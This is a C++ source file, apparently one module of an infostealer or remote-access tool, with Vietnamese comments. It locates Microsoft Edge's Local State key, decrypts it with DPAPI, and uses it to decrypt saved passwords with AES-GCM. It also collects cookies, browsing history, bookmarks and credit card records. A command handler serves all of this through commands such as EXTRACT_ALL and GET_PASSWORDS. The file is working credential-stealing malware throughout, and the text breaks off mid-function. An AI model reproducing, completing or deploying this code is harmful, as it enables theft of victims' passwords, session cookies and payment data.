#include "EdgeManager.hpp"

// Windows headers
#define NOMINMAX
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <dpapi.h>
#include <shlwapi.h>

// Standard C++ headers
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <codecvt>
#include <locale>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cstdio>
#include <map>

// Database
#include <sqlite3.h>

// OpenSSL for AES-GCM
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>

// Link libraries
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== PATH UTILITIES ====================

std::string EdgeManager::getAppDataPath() {
    wchar_t* localAppData = nullptr;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);
    
    std::wstring wpath(localAppData);
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string path = converter.to_bytes(wpath);
    
    CoTaskMemFree(localAppData);
    return path;
}

std::string EdgeManager::getEdgeDatabasePath() {
    std::string appData = getAppDataPath();
    return appData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
}

std::string EdgeManager::getLocalStatePath() {
    std::string appData = getAppDataPath();
    return appData + "\\Microsoft\\Edge\\User Data\\Local State";
}

// ==================== DATABASE HELPERS ====================

bool EdgeManager::copyDatabaseFile(const std::string& sourcePath, const std::string& destPath) {
    DWORD attrs = GetFileAttributesA(sourcePath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return false;
    }
    
    if (!CopyFileA(sourcePath.c_str(), destPath.c_str(), FALSE)) {
        return false;
    }
    
    SetFileAttributesA(destPath.c_str(), FILE_ATTRIBUTE_NORMAL);
    return true;
}

sqlite3* EdgeManager::openDatabase(const std::string& path, bool copyFirst) {
    sqlite3* db = nullptr;
    std::string dbPath = path;
    std::string tempPath = "";
    
    if (copyFirst) {
        char tempName[L_tmpnam];
        std::tmpnam(tempName);
        tempPath = std::string(tempName) + ".db";
        
        if (!copyDatabaseFile(path, tempPath)) {
            return nullptr;
        }
        
        dbPath = tempPath;
    }
    
    if (sqlite3_open_v2(dbPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        if (!tempPath.empty()) {
            DeleteFileA(tempPath.c_str());
        }
        return nullptr;
    }
    
    return db;
}

void EdgeManager::closeDatabase(sqlite3* db, const std::string& tempPath) {
    if (db) {
        sqlite3_close(db);
    }
    
    if (!tempPath.empty()) {
        DeleteFileA(tempPath.c_str());
    }
}

// ==================== BASE64 UTILITIES ====================

std::vector<unsigned char> EdgeManager::base64Decode(const std::string& encoded) {
    if (encoded.empty()) return {};
    
    std::string clean_encoded;
    for (char c : encoded) {
        if (!isspace(static_cast<unsigned char>(c))) {
            clean_encoded += c;
        }
    }
    
    DWORD dataLen = 0;
    
    if (!CryptStringToBinaryA(clean_encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                              NULL, &dataLen, NULL, NULL)) {
        return {};
    }
    
    std::vector<unsigned char> data(dataLen);
    
    if (!CryptStringToBinaryA(clean_encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                              data.data(), &dataLen, NULL, NULL)) {
        return {};
    }
    
    data.resize(dataLen);
    return data;
}

std::string EdgeManager::base64Encode(const unsigned char* data, size_t length) {
    if (!data || length == 0) return "";
    
    DWORD base64Len = 0;
    
    if (!CryptBinaryToStringA(data, (DWORD)length, 
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                              NULL, &base64Len)) {
        return "";
    }
    
    std::string base64(base64Len, 0);
    
    if (!CryptBinaryToStringA(data, (DWORD)length, 
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                              &base64[0], &base64Len)) {
        return "";
    }
    
    base64.resize(base64Len);
    return base64;
}

// ==================== MASTER KEY EXTRACTION - FIXED ====================

std::vector<unsigned char> EdgeManager::getMasterKey() {
    std::string localStatePath = getLocalStatePath();
    
    // Mở file với encoding đúng
    std::ifstream file(localStatePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "[ERROR] Cannot open Local State file" << std::endl;
        return {};
    }

    try {
        // Đọc toàn bộ file
        std::string content((std::istreambuf_iterator<char>(file)), 
                            std::istreambuf_iterator<char>());
        file.close();
        
        // Tìm encrypted_key trong JSON (Edge dùng format khác)
        size_t start = content.find("\"encrypted_key\":\"");
        if (start == std::string::npos) {
            // Thử format khác
            start = content.find("\"os_crypt\":{\"encrypted_key\":\"");
            if (start != std::string::npos) {
                start = content.find("\"encrypted_key\":\"", start);
            }
        }
        
        if (start == std::string::npos) {
            std::cerr << "[ERROR] Could not find encrypted_key in Local State" << std::endl;
            return {};
        }
        
        start += 17; // Độ dài của "\"encrypted_key\":\""
        size_t end = content.find("\"", start);
        if (end == std::string::npos) {
            std::cerr << "[ERROR] Malformed JSON in Local State" << std::endl;
            return {};
        }
        
        std::string encrypted_key_b64 = content.substr(start, end - start);
        
        // Base64 decode
        std::vector<unsigned char> encrypted_key = base64Decode(encrypted_key_b64);
        if (encrypted_key.empty()) {
            std::cerr << "[ERROR] Failed to decode base64 key" << std::endl;
            return {};
        }
        
        // Kiểm tra và loại bỏ prefix "v10" nếu có
        if (encrypted_key.size() > 3 && 
            encrypted_key[0] == 'v' && 
            encrypted_key[1] == '1' && 
            encrypted_key[2] == '0') {
            encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 3);
        }
        
        // DPAPI decrypt
        DATA_BLOB dataIn, dataOut;
        dataIn.pbData = encrypted_key.data();
        dataIn.cbData = (DWORD)encrypted_key.size();
        
        if (CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut)) {
            std::vector<unsigned char> masterKey(dataOut.pbData, dataOut.pbData + dataOut.cbData);
            LocalFree(dataOut.pbData);
            
            if (masterKey.size() == 32) { // AES-256 key
                std::cout << "[SUCCESS] Master key extracted (32 bytes)" << std::endl;
                return masterKey;
            } else {
                std::cerr << "[ERROR] Master key is wrong size: " << masterKey.size() << " bytes" << std::endl;
                return {};
            }
        } else {
            DWORD error = GetLastError();
            std::cerr << "[ERROR] DPAPI failed (Error " << error << "). Trying alternative method..." << std::endl;
            
            // Thử phương pháp thay thế: đọc trực tiếp từ file JSON
            try {
                // Parse JSON đầy đủ
                size_t osCryptStart = content.find("\"os_crypt\"");
                if (osCryptStart != std::string::npos) {
                    size_t braceStart = content.find("{", osCryptStart);
                    size_t braceEnd = content.find("}", braceStart);
                    
                    if (braceEnd != std::string::npos) {
                        std::string osCryptSection = content.substr(braceStart, braceEnd - braceStart + 1);
                        // Đơn giản: tìm encrypted_key trực tiếp
                        size_t keyPos = osCryptSection.find("\"encrypted_key\":\"");
                        if (keyPos != std::string::npos) {
                            keyPos += 17;
                            size_t keyEnd = osCryptSection.find("\"", keyPos);
                            if (keyEnd != std::string::npos) {
                                std::string keyB64 = osCryptSection.substr(keyPos, keyEnd - keyPos);
                                std::vector<unsigned char> keyData = base64Decode(keyB64);
                                
                                // Loại bỏ "v10"
                                if (keyData.size() > 3 && 
                                    keyData[0] == 'v' && 
                                    keyData[1] == '1' && 
                                    keyData[2] == '0') {
                                    keyData.erase(keyData.begin(), keyData.begin() + 3);
                                }
                                
                                // Thử DPAPI lại
                                dataIn.pbData = keyData.data();
                                dataIn.cbData = (DWORD)keyData.size();
                                
                                if (CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut)) {
                                    std::vector<unsigned char> masterKey(dataOut.pbData, dataOut.pbData + dataOut.cbData);
                                    LocalFree(dataOut.pbData);
                                    
                                    if (masterKey.size() == 32) {
                                        std::cout << "[SUCCESS] Master key extracted via alternative method" << std::endl;
                                        return masterKey;
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (...) {
                // Bỏ qua lỗi
            }
            
            return {};
        }

    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Reading Local State: " << e.what() << std::endl;
        return {};
    }
}

// ==================== AES-GCM DECRYPTION ====================

std::vector<unsigned char> EdgeManager::decryptAESGCM(const std::vector<unsigned char>& ciphertext,
                                                    const std::vector<unsigned char>& key,
                                                    const std::vector<unsigned char>& iv) {
    if (ciphertext.size() < 16 || key.size() != 32 || iv.size() != 12) {
        return {};
    }
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    
    // Tách tag (16 bytes cuối)
    size_t ciphertext_len = ciphertext.size() - 16;
    std::vector<unsigned char> tag(ciphertext.end() - 16, ciphertext.end());
    std::vector<unsigned char> encrypted_data(ciphertext.begin(), ciphertext.end() - 16);
    
    std::vector<unsigned char> plaintext(ciphertext_len + 16);
    int len = 0, total_len = 0;
    
    // Khởi tạo
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr)) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Set IV length
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr)) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Set key và IV
    if (!EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data())) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Giải mã
    if (!EVP_DecryptUpdate(ctx, plaintext.data(), &len, encrypted_data.data(), (int)ciphertext_len)) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    total_len += len;
    
    // Set authentication tag
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag.data())) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Finalize
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + total_len, &len) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    total_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(total_len);
    
    return plaintext;
}

// ==================== SIMPLE COOKIES EXTRACTION ====================

json EdgeManager::extractCookies() {
    json cookies = json::array();
    
    // Thử cả hai vị trí
    std::string cookiePath1 = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Cookies";
    std::string cookiePath2 = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
    
    std::string cookiePath;
    if (GetFileAttributesA(cookiePath1.c_str()) != INVALID_FILE_ATTRIBUTES) {
        cookiePath = cookiePath1;
    } else if (GetFileAttributesA(cookiePath2.c_str()) != INVALID_FILE_ATTRIBUTES) {
        cookiePath = cookiePath2;
    } else {
        std::cout << "[INFO] Cookies file not found" << std::endl;
        return cookies;
    }
    
    // Copy file
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(cookiePath, tempPath)) {
        return cookies;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return cookies;
    }
    
    // Kiểm tra tables
    sqlite3_stmt* tableStmt;
    const char* tableSql = "SELECT name FROM sqlite_master WHERE type='table'";
    
    std::vector<std::string> tables;
    if (sqlite3_prepare_v2(db, tableSql, -1, &tableStmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(tableStmt) == SQLITE_ROW) {
            const unsigned char* name = sqlite3_column_text(tableStmt, 0);
            if (name) {
                tables.push_back(reinterpret_cast<const char*>(name));
            }
        }
        sqlite3_finalize(tableStmt);
    }
    
    if (tables.empty()) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cookies;
    }
    
    // Tìm bảng cookies
    std::string cookieTable;
    for (const auto& table : tables) {
        if (table.find("cookie") != std::string::npos || 
            table == "cookies" ||
            table == "moz_cookies") {
            cookieTable = table;
            break;
        }
    }
    
    if (cookieTable.empty()) {
        // Thử bảng đầu tiên
        cookieTable = tables[0];
    }
    
    // Query đơn giản
    std::string sql = "SELECT * FROM " + cookieTable + " LIMIT 100";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cookies;
    }
    
    int colCount = sqlite3_column_count(stmt);
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json cookie;
        
        for (int i = 0; i < colCount; i++) {
            std::string colName = sqlite3_column_name(stmt, i);
            
            switch (sqlite3_column_type(stmt, i)) {
                case SQLITE_TEXT: {
                    const unsigned char* text = sqlite3_column_text(stmt, i);
                    if (text) {
                        cookie[colName] = reinterpret_cast<const char*>(text);
                    }
                    break;
                }
                case SQLITE_INTEGER:
                    cookie[colName] = sqlite3_column_int64(stmt, i);
                    break;
                case SQLITE_BLOB: {
                    // Đối với cookies, thường không cần giải mã
                    int size = sqlite3_column_bytes(stmt, i);
                    const void* data = sqlite3_column_blob(stmt, i);
                    if (data && size > 0) {
                        // Chỉ lấy nếu là text
                        std::string str(static_cast<const char*>(data), size);
                        if (std::all_of(str.begin(), str.end(), [](char c) {
                            return std::isprint(static_cast<unsigned char>(c)) || c == '\0';
                        })) {
                            str.erase(std::remove(str.begin(), str.end(), '\0'), str.end());
                            cookie[colName] = str;
                        }
                    }
                    break;
                }
            }
        }
        
        cookies.push_back(cookie);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return cookies;
}

// ==================== PASSWORDS EXTRACTION WITH FALLBACK ====================

json EdgeManager::extractPasswords() {
    json passwords = json::array();
    
    std::string loginDataPath = getEdgeDatabasePath();
    if (GetFileAttributesA(loginDataPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return passwords;
    }
    
    // Copy file
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(loginDataPath, tempPath)) {
        return passwords;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return passwords;
    }
    
    // Query đơn giản - chỉ lấy các cột cơ bản
    std::string sql = "SELECT origin_url, username_value, password_value FROM logins LIMIT 50";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return passwords;
    }
    
    std::vector<unsigned char> masterKey = getMasterKey();
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json password;
        
        // URL
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        if (url) password["url"] = reinterpret_cast<const char*>(url);
        
        // Username
        const unsigned char* username = sqlite3_column_text(stmt, 1);
        if (username) password["username"] = reinterpret_cast<const char*>(username);
        
        // Password
        int blobSize = sqlite3_column_bytes(stmt, 2);
        const void* blobData = sqlite3_column_blob(stmt, 2);
        
        if (blobData && blobSize > 0) {
            std::vector<unsigned char> encryptedData(
                static_cast<const unsigned char*>(blobData),
                static_cast<const unsigned char*>(blobData) + blobSize
            );
            
            // Kiểm tra xem có phải v10 không
            if (encryptedData.size() > 3 && 
                encryptedData[0] == 'v' && 
                encryptedData[1] == '1' && 
                encryptedData[2] == '0') {
                
                // Có master key thì giải mã AES-GCM
                if (!masterKey.empty() && encryptedData.size() > 15) {
                    try {
                        std::vector<unsigned char> iv(encryptedData.begin() + 3, 
                                                     encryptedData.begin() + 15);
                        std::vector<unsigned char> ciphertext(encryptedData.begin() + 15, 
                                                             encryptedData.end());
                        
                        std::vector<unsigned char> decrypted = decryptAESGCM(ciphertext, masterKey, iv);
                        
                        if (!decrypted.empty()) {
                            std::string passStr(decrypted.begin(), decrypted.end());
                            passStr.erase(std::remove(passStr.begin(), passStr.end(), '\0'), passStr.end());
                            password["password"] = passStr;
                            password["encryption"] = "AES-GCM";
                        } else {
                            password["password"] = "[ENCRYPTED_AES]";
                            password["encryption"] = "AES-GCM_FAILED";
                        }
                    } catch (...) {
                        password["password"] = "[ENCRYPTED_AES_ERROR]";
                    }
                } else {
                    // Không có master key
                    password["password"] = "[ENCRYPTED_NO_KEY]";
                    password["encryption"] = "AES-GCM_NO_KEY";
                }
            } else {
                // Không phải v10, có thể là plain text hoặc DPAPI
                // Thử đọc như string trước
                std::string passStr(static_cast<const char*>(blobData), blobSize);
                
                // Kiểm tra xem có phải là text hợp lệ không
                bool isPrintable = std::all_of(passStr.begin(), passStr.end(), [](char c) {
                    return std::isprint(static_cast<unsigned char>(c)) || c == '\0';
                });
                
                if (isPrintable && passStr.size() > 0) {
                    passStr.erase(std::remove(passStr.begin(), passStr.end(), '\0'), passStr.end());
                    password["password"] = passStr;
                    password["encryption"] = "PLAIN_TEXT";
                } else {
                    // Có thể là DPAPI hoặc binary data
                    password["password"] = "[BINARY_DATA]";
                    password["encryption"] = "UNKNOWN";
                }
            }
        } else {
            password["password"] = "";
        }
        
        passwords.push_back(password);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return passwords;
}

// ==================== SIMPLE HISTORY EXTRACTION ====================

json EdgeManager::extractHistory() {
    json history = json::array();
    
    std::string historyPath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\History";
    if (GetFileAttributesA(historyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return history;
    }
    
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(historyPath, tempPath)) {
        return history;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return history;
    }
    
    // Query đơn giản
    std::string sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return history;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json entry;
        
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* title = sqlite3_column_text(stmt, 1);
        
        if (url) entry["url"] = reinterpret_cast<const char*>(url);
        if (title) entry["title"] = reinterpret_cast<const char*>(title);
        
        entry["visits"] = sqlite3_column_int(stmt, 2);
        entry["last_visit"] = sqlite3_column_int64(stmt, 3);
        
        history.push_back(entry);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return history;
}

// ==================== SIMPLE BOOKMARKS EXTRACTION ====================

json EdgeManager::extractBookmarks() {
    json bookmarks = json::array();
    
    std::string bookmarksPath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Bookmarks";
    std::ifstream file(bookmarksPath);
    
    if (!file.is_open()) {
        return bookmarks;
    }
    
    try {
        json bookmarksJson;
        file >> bookmarksJson;
        
        if (bookmarksJson.contains("roots")) {
            auto& roots = bookmarksJson["roots"];
            
            // Hàm đệ quy để trích xuất bookmarks
            std::function<void(const json&, const std::string&)> extract;
            extract = [&](const json& node, const std::string& folder) {
                if (node.is_object()) {
                    if (node.contains("type")) {
                        std::string type = node["type"];
                        if (type == "url") {
                            json bookmark;
                            bookmark["name"] = node.value("name", "");
                            bookmark["url"] = node.value("url", "");
                            bookmark["folder"] = folder;
                            bookmarks.push_back(bookmark);
                        } else if (type == "folder" && node.contains("children")) {
                            std::string newFolder = folder.empty() ? 
                                node.value("name", "") : 
                                folder + "/" + node.value("name", "");
                            
                            for (const auto& child : node["children"]) {
                                extract(child, newFolder);
                            }
                        }
                    }
                }
            };
            
            // Trích xuất từ các thư mục gốc
            if (roots.contains("bookmark_bar")) {
                extract(roots["bookmark_bar"], "Bookmarks Bar");
            }
            if (roots.contains("other")) {
                extract(roots["other"], "Other Bookmarks");
            }
            if (roots.contains("synced")) {
                extract(roots["synced"], "Synced");
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Parsing bookmarks: " << e.what() << std::endl;
    }
    
    return bookmarks;
}

// ==================== CREDIT CARDS EXTRACTION ====================

json EdgeManager::extractCreditCards() {
    json cards = json::array();
    
    std::string webDataPath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Web Data";
    if (GetFileAttributesA(webDataPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return cards;
    }
    
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(webDataPath, tempPath)) {
        return cards;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return cards;
    }
    
    // Kiểm tra bảng credit_cards
    sqlite3_stmt* checkStmt;
    const char* checkSql = "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards'";
    
    bool hasTable = false;
    if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, nullptr) == SQLITE_OK) {
        if (sqlite3_step(checkStmt) == SQLITE_ROW) {
            hasTable = true;
        }
        sqlite3_finalize(checkStmt);
    }
    
    if (!hasTable) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cards;
    }
    
    // Query đơn giản
    std::string sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards LIMIT 10";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cards;
    }
    
    std::vector<unsigned char> masterKey = getMasterKey();
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json card;
        
        // Name
        const unsigned char* name = sqlite3_column_text(stmt, 0);
        if (name) card["name"] = reinterpret_cast<const char*>(name);
        
        // Expiration
        card["exp_month"] = sqlite3_column_int(stmt, 1);
        card["exp_year"] = sqlite3_column_int(stmt, 2);
        
        // Card number (encrypted)
        int blobSize = sqlite3_column_bytes(stmt, 3);
        const void* blobData = sqlite3_column_blob(stmt, 3);
        
        if (blobData && blobSize > 0) {
            card["number"] = "[ENCRYPTED]";
            card["encrypted_size"] = blobSize;
            
            // Có thể thử giải mã nếu có master key
            if (!masterKey.empty()) {
                // Thử giải mã ở đây nếu cần
            }
        }
        
        cards.push_back(card);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return cards;
}

// ==================== MAIN EXTRACTION FUNCTION ====================

json EdgeManager::extractEdgeData() {
    json result;
    
    try {
        std::cout << "\n=== EDGE DATA EXTRACTION ===\n" << std::endl;
        
        // 1. Master key (quan trọng nhưng không bắt buộc)
        std::cout << "[1/5] Getting master key..." << std::endl;
        std::vector<unsigned char> masterKey = getMasterKey();
        if (!masterKey.empty()) {
            std::cout << "✓ Master key: FOUND (" << masterKey.size() << " bytes)" << std::endl;
            result["master_key_status"] = "FOUND";
        } else {
            std::cout << "✗ Master key: NOT FOUND (some passwords may be encrypted)" << std::endl;
            result["master_key_status"] = "NOT_FOUND";
        }
        
        // 2. Cookies
        std::cout << "[2/5] Extracting cookies..." << std::endl;
        result["cookies"] = extractCookies();
        std::cout << "✓ Cookies: " << result["cookies"].size() << std::endl;
        
        // 3. Passwords
        std::cout << "[3/5] Extracting passwords..." << std::endl;
        result["passwords"] = extractPasswords();
        std::cout << "✓ Passwords: " << result["passwords"].size() << std::endl;
        
        // 4. History
        std::cout << "[4/5] Extracting history..." << std::endl;
        result["history"] = extractHistory();
        std::cout << "✓ History: " << result["history"].size() << std::endl;
        
        // 5. Bookmarks
        std::cout << "[5/5] Extracting bookmarks..." << std::endl;
        result["bookmarks"] = extractBookmarks();
        std::cout << "✓ Bookmarks: " << result["bookmarks"].size() << std::endl;
        
        // 6. Credit cards (optional)
        std::cout << "[+] Checking credit cards..." << std::endl;
        result["credit_cards"] = extractCreditCards();
        std::cout << "✓ Credit Cards: " << result["credit_cards"].size() << std::endl;
        
        std::cout << "\n=== EXTRACTION COMPLETE ===\n" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Extraction failed: " << e.what() << std::endl;
        result["error"] = e.what();
    }
    
    return result;
}

// ==================== COMMAND HANDLER ====================

json EdgeManager::handle_command(const json& request) {
    try {
        if (!request.contains("command")) {
            return {{"status", "error"}, {"message", "Missing command"}};
        }
        
        std::string command = request["command"].get<std::string>();
        
        if (command == "EXTRACT_ALL") {
            json result = extractEdgeData();
            result["status"] = "success";
            result["module"] = "EDGE";
            return result;
            
        } else if (command == "GET_PASSWORDS") {
            json passwords = extractPasswords();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_PASSWORDS"},
                {"count", passwords.size()},
                {"data", passwords}
            };
            
        } else if (command == "GET_COOKIES") {
            json cookies = extractCookies();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_COOKIES"},
                {"count", cookies.size()},
                {"data", cookies}
            };
            
        } else if (command == "GET_HISTORY") {
            json history = extractHistory();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_HISTORY"},
                {"count", history.size()},
                {"data", history}
            };
            
        } else if (command == "GET_BOOKMARKS") {
            json bookmarks = extractBookmarks();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_BOOKMARKS"},
                {"count", bookmarks.size()},
                {"data", bookmarks}
            };
            
        } else if (command == "GET_CREDIT_CARDS") {
            json cards = extractCreditCards();
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"command", "GET_CREDIT_CARDS"},
                {"count", cards.size()},
                {"data", cards}
            };
            
        } else if (command == "TEST") {
            // Kiểm tra file tồn tại
            std::string basePath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\";
            
            json fileStatus;
            
            // Kiểm tra từng file
            auto checkFile = [&](const std::string& name, const std::string& path) {
                bool exists = GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
                fileStatus[name] = exists ? "FOUND" : "NOT_FOUND";
                
                if (exists) {
                    std::ifstream file(path, std::ios::binary | std::ios::ate);
                    if (file.is_open()) {
                        std::streamsize size = file.tellg();
                        file.close();
                        fileStatus[name + "_size"] = std::to_string(size) + " bytes";
                    }
                }
            };
            
            checkFile("Local State", getLocalStatePath());
            checkFile("Cookies", basePath + "Cookies");
            checkFile("Network Cookies", basePath + "Network\\Cookies");
            checkFile("Login Data", basePath + "Login Data");
            checkFile("History", basePath + "History");
            checkFile("Bookmarks", basePath + "Bookmarks");
            checkFile("Web Data", basePath + "Web Data");
            
            // Master key
            std::vector<unsigned char> masterKey = getMasterKey();
            
            return {
                {"status", "success"},
                {"module", "EDGE"},
                {"test_results", fileStatus},
                {"master_key", !masterKey.empty() ? "AVAILABLE" : "UNAVAILABLE"},
                {"master_key_size", masterKey.size()}
            };
            
        } else if (command == "DEBUG_MASTER_KEY") {
            // Debug chi tiết master key
            std::string localStatePath = getLocalStatePath();
            std::ifstream file(localStatePath, std::ios::binary);
            
            json debugInfo;
            debugInfo["local_state_path"] = localStatePath;
            
            if (!file.is_open()) {
                debugInfo["error"] = "Cannot open file";
                return {{"status", "error"}, {"debug", debugInfo}};
            }
            
            std::string content((std::istreambuf_iterator<char>(file)), 
                               std::istreambuf_iterator<char>());
            file.close();
            
            // Tìm os_crypt section
            size_t osCryptStart = content.find("\"os_crypt\"");
            if (osCryptStart != std::string::npos) {
                size_t osCryptEnd = content.find("}", osCryptStart);
                if (osCryptEnd != std::string::npos) {
                    std::string osCryptSection = content.substr(osCryptStart, osCryptEnd - osCryptStart + 1);
                    debugInfo["os_crypt_section"] = osCryptSection;
                    
                    // Tìm encrypted_key
                    size_t keyStart = osCryptSection.find("\"encrypted_key\":\"");
                    if (keyStart != std::string::npos) {
                        keyStart += 17;
                        size_t keyEnd = osCryptSection.find("\"", keyStart);
                        if (keyEnd != std::string::npos) {
                            std::string keyB64 = osCryptSection.substr(keyStart, keyEnd - keyStart);
                            debugInfo["encrypted_key_b64"] = keyB64;
                            
                            // Decode
                            std::vector<unsigned char> decoded = base64Decode(keyB64);
                            debugInfo["decoded_size"] = decoded.size();
                            
                            if (decoded.size() > 0) {
                                // Hex dump
                                std::stringstream hex;
                                hex << std::hex << std::setfill('0');
                                for (size_t i = 0; i < std::min(decoded.size(), (size_t)32); i++) {
                                    hex << std::setw(2) << (int)decoded[i] << " ";
                                }
                                debugInfo["decoded_hex"] = hex.str();
                                
                                // Check for v10 prefix
                                if (decoded.size() > 3 && 
                                    decoded[0] == 'v' && 
                                    decoded[1] == '1' && 
                                    decoded[2] == '0') {
                                    debugInfo["has_v10_prefix"] = true;
                                    debugInfo["data_after_v10_size"] = decoded.size() - 3;
                                }
                            }
                        }
                    }
                }
            }
            
            // Thử DPAPI
            std::vector<unsigned char> masterKey = getMasterKey();
            debugInfo["master_key_found"] = !masterKey.empty();
            debugInfo["master_key_size"] = masterKey.size();
            
            if (!masterKey.empty()) {
                std::stringstream hex;
                hex << std::hex << std::setfill('0');
                for (size_t i = 0; i < std::min(masterKey.size(), (size_t)16); i++) {
                    hex << std::setw(2) << (int)masterKey[i] << " ";
                }
                debugInfo["master_key_hex"] = hex.str();
            }
            
